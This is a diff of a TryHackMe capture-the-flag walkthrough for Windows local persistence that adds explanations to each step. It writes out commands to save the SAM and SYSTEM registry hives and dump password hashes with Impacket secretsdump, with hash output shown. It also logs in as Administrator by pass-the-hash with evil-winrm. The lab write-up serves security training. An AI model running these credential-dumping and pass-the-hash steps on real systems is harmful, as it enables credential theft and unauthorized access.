@@ -2,7 +2,7 @@
 Module link: https://tryhackme.com/room/windowslocalpersistence
 
 # Assigning Group Memberships
-1. Start this room's machine
+1. Start this room's machine and our TryHackMe AttackBox
 2. `cd \` to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
 ```PowerShell
 C:\Users\Administrator>cd \
@@ -63,13 +63,13 @@ Mandatory Label\High Mandatory Level Label            S-1-16-12288
 ```Bash
 *Evil-WinRM* PS C:\Users\thmuser1\Documents> cd \
 ```
-10. `reg save hklm\system {FILENAME1}.bak` to create and save a backup file of the compromised Windows machine's **System** registry key
+10. `reg save hklm\system {FILENAME1}.bak` to create and save a backup file of the compromised Windows machine's **System** registry key, which successfully created the backup file on the compromised machine
 ```Bash
 *Evil-WinRM* PS C:\> reg save hklm\system SYSTEM.bak
 The operation completed successfully.
 
 ```
-11. `reg save hklm\sam {FILENAME2}.bak` to create and save a backup file of the compromised Windows machine's **SAM** registry key
+11. `reg save hklm\sam {FILENAME2}.bak` to create and save a backup file of the compromised Windows machine's **SAM** registry key, which successfully created the backup file on the compromised machine
 ```Bash
 *Evil-WinRM* PS C:\> reg save hklm\sam SAM.bak
 The operation completed successfully.
@@ -91,7 +91,7 @@ Info: Downloading C:\\SAM.bak to SAM.bak
                                                              
 Info: Download successful!
 ```
-14. `exit`
+14. `exit` to exit our current PowerShell session on our attack machine and terminate the connection
 ```Bash
 *Evil-WinRM* PS C:\> exit
 
@@ -99,13 +99,13 @@ Info: Exiting with code 0
 
 root@ip-10-10-72-227:~# 
 ```
-15. `ls`
+15. `ls` to display the files and directories that are in our current working directory onto our terminal, which showed that the two backup files were indeed successfully downloaded onto our machine
 ```Bash
 root@ip-10-10-72-227:~# ls
 Desktop    Instructions  Postman  SAM.bak  SYSTEM.bak         Tools
 Downloads  Pictures      Rooms    Scripts  thinclient_drives  work
 ```
-16. `python3.9 /opt/impacket/examples/secretsdump.py -sam {FILENAME2}.bak -system {FILENAME1}.bak LOCAL`
+16. `python3.9 /opt/impacket/examples/secretsdump.py -sam {FILENAME2}.bak -system {FILENAME1}.bak LOCAL` to dump the password hashes of all the users that are in the compromised machine from its SAM registry key that we backed up into a file into Impacket's **secretsdump.py** program (https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), which was already installed on our AttackBox, using both backup files that we created on and retrieved from the compromised machine and output the results onto our terminal, which ended up outputting the compromised machine's administrator's password hash which we can then use to authenticate as the administrator when remotely connecting back to the compromised machine using WinRM
 ```Bash
 root@ip-10-10-72-227:~# python3.9 /opt/impacket/examples/secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL 
 Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
@@ -123,7 +123,7 @@ thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:
 thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
 [*] Cleaning up... 
 ```
-17. `evil-winrm -i {TARGET IP} -u Administrator -H {PASSWORD HASH}`
+17. `evil-winrm -i {TARGET IP} -u Administrator -H {PASSWORD HASH}` to perform a Pass-the-Hash (PtH) attack on the compromised machine to log in as the Administrator using their password hash, which ended up working
 ```Bash
 root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
 
@@ -133,7 +133,7 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
 ```
-18. `C:\flags\flag1.exe`
+18. `C:\flags\flag1.exe` to run the flag1.exe program, which ended up displaying this task's flag onto our terminal
 ```Bash
 *Evil-WinRM* PS C:\Users\Administrator\Documents> C:\flags\flag1.exe
 THM{FLAG_BACKED_UP!}
@@ -299,7 +299,7 @@ SeRestorePrivilege            Restore files and directories  Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
-17. `C:\flags\flag2.exe`
+17. `C:\flags\flag2.exe` to run the flag2.exe program, which ended up displaying this task's flag onto our terminal
 ```Bash
 *Evil-WinRM* PS C:\Users\thmuser2\Documents> C:\flags\flag2.exe
 THM{IM_JUST_A_NORMAL_USER}
@@ -373,7 +373,7 @@ Error: Exiting with code 1
 C:\Users\Administrator>whoami
 wpersistence\administrator
 ```
-9. `C:\flags\flag3.exe`
+9. `C:\flags\flag3.exe` to run the flag3.exe program, which ended up displaying this task's flag onto our terminal
 ```PowerShell
 C:\Users\Administrator>C:\flags\flag3.exe
 THM{TRUST_ME_IM_AN_ADMIN}
